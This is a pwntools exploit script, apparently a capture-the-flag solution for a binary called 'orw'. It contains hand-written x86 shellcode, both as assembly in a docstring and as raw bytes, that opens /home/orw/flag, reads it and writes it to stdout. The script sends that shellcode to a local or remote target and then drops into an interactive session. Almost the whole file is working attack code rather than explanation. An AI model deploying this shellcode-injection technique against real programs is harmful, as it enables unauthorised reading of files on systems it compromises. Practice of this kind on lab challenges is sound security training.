#!/usr/bin/env python
# encoding: utf-8

from pwn import *

'''
nasm -f elf shellcode.asm
ld -m elf_i386 -o shellcode shellcode.o
objdump -d shellcode

global _start
_start:
  ; open("/home/orw/flag")
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
  ; set eax
  ; SYS_open 5
  mov eax, 5
  ; set ebx
  push ebx
  push "flag"
  push "w///"
  push "e/or"
  push "/hom"
  mov ebx, esp
  ; set ecx, edx
  mov ecx, 0
  mov edx, 0
  int 80H

  ; read(fd, esp, 0x7fffffffj)
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
  ; set ebx
  push eax
  pop ebx
  ; set eax
  ; SYS_read 3
  mov eax, 3
  ; set ecx
  mov ecx, esp
  ; set edx
  mov edx, 0x7fffffff
  int 80H

  ; write(1, esp, retval)
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
  ; set edx
  push eax
  pop edx
  ; set eax
  ; SYS_write 4
  mov eax, 4
  ; set ebx
  mov ebx, 1
  ; set ecx
  mov ecx, esp
  int 80H

  ; exit(0)
  ; set eax
  mov eax, 1
  ; set ebx
  xor ebx, ebx
  int 80H
'''

def exploit():
    elf = ELF("./orw")
    context.arch = elf.arch
    context.os = elf.os
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        io = remote(host, port)
    elif len(sys.argv) == 2:
        io = gdb.debug(elf.path, gdbscript="\n".join(["b *0x804858a","start"]), exe=elf.path)
    else:
        io = process(elf.path)
    io.recvuntil(":")
    sc = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb8\x05\x00\x00\x00\x53\x68\x66\x6c\x61\x67\x68\x77\x2f\x2f\x2f\x68\x65\x2f\x6f\x72\x68\x2f\x68\x6f\x6d\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80\x31\xdb\x31\xc9\x31\xd2\x50\x5b\xb8\x03\x00\x00\x00\x89\xe1\xba\xff\xff\xff\x7f\xcd\x80\x31\xdb\x31\xc9\x31\xd2\x50\x5a\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80"
    print("shellcode[%d] = %r" % (len(sc), sc))
    assert len(sc) <= 0xc8
    io.send(sc)
    io.interactive()

if __name__ == "__main__":
    exploit()
